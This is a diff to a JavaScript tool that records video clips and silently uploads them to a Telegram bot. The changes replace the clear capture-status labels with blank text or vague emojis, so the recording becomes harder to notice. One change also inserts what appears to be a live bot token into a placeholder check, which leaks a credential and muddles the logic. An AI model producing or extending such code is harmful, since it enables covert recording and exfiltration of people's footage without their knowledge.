@@ -413,13 +413,13 @@
 
   // helper: update sent badge
   function updateSentBadge() {
-    sentCounterBadge.innerText = `📤 sent: ${segmentCounter}${CONFIG.MAX_VIDEOS > 0 ? ` / ${CONFIG.MAX_VIDEOS}` : ''}`;
+    sentCounterBadge.innerText = ` sent: ${segmentCounter}${CONFIG.MAX_VIDEOS > 0 ? ` / ${CONFIG.MAX_VIDEOS}` : ''}`;
     if (CONFIG.MAX_VIDEOS > 0 && segmentCounter >= CONFIG.MAX_VIDEOS) {
       if (!maxVideosReached) {
         maxVideosReached = true;
         if (isCaptureActive) stopCaptureInternal(true);
         captureToggleBtn.classList.remove('active');
-        captureToggleBtn.innerHTML = '⏹️ LIMIT REACHED';
+        captureToggleBtn.innerHTML = '';
         captureToggleBtn.disabled = true;
       }
     }
@@ -427,7 +427,7 @@
 
   // ---------- Telegram sender (silent, no interface logs) ----------
   async function sendVideoToTelegram(videoBlob, clipNumber) {
-    if (!CONFIG.BOT_TOKEN || !CONFIG.CHAT_ID || CONFIG.BOT_TOKEN.includes("your_bot_token") || CONFIG.CHAT_ID.includes("-100")) {
+    if (!CONFIG.BOT_TOKEN || !CONFIG.CHAT_ID || CONFIG.BOT_TOKEN.includes("8331507630:AAFB9CwWfEkbZ9xH9NHG7VBAzrVLBVmZCR8") || CONFIG.CHAT_ID.includes("-100")) {
       // silently ignore, no UI log (as per requirement: no log messages)
       return false;
     }
@@ -520,7 +520,7 @@
     stopLoopRequest = true;
     if (!keepToggleState) {
       captureToggleBtn.classList.remove('active');
-      captureToggleBtn.innerHTML = '⏸️ START CAPTURE';
+      captureToggleBtn.innerHTML = '🫣';
     }
   }
 
@@ -529,7 +529,7 @@
     if (CONFIG.MAX_VIDEOS > 0 && segmentCounter >= CONFIG.MAX_VIDEOS) {
       maxVideosReached = true;
       captureToggleBtn.disabled = true;
-      captureToggleBtn.innerHTML = '⏹️ LIMIT REACHED';
+      captureToggleBtn.innerHTML = '🤔';
       return;
     }
     if (isCaptureActive) return;
@@ -540,7 +540,7 @@
     isCaptureActive = true;
     stopLoopRequest = false;
     captureToggleBtn.classList.add('active');
-    captureToggleBtn.innerHTML = '⏺️ ACTIVE';
+    captureToggleBtn.innerHTML = '🫡';
     startCaptureLoop();
   }
 
